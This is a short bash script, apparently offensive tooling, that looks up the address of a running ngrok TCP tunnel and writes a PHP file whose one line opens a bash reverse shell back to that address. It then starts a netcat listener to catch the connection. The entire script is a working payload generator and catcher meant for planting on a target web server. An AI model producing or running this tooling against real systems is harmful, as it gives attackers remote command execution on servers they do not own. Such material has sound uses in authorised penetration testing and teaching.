#!/bin/bash

# Fetch the public URL
public_url=$(curl -s http://localhost:4040/api/tunnels | jq -r .tunnels[0].public_url)

# Check if the public URL is empty
if [ -z "$public_url" ]; then
  echo "Error: ngrok TCP tunnel is not up."
  exit 1
else
  # Separate URL and port
  url=$(echo $public_url | awk -F[/:] '{print $4}')
  port=$(echo $public_url | awk -F[/:] '{print $5}')

  # Create the PHP file
  echo "<?PHP system('bash -c \"bash -i >& /dev/tcp/$url/$port 0>&1\"'); ?>" > generated.php

  echo "PHP file generated with URL: $url and Port: $port"
  nc -lvnp $port
fi

